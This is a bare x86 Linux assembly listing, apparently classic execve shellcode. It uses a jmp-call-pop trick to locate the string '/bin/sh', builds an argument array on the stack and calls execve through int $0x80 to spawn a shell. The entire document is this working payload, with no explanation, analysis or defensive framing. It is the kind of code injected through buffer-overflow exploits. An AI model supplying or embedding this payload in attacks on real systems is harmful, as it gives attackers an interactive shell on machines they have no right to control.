.text

_start:
jmp binsh
execv:
pop %ebx
push %ebx
mov %esp, %ecx
xor %edx,%edx
mov $0xb, %al
int $0x80
binsh:
xor %eax,%eax
push %eax
call execv
.string "/bin/sh"

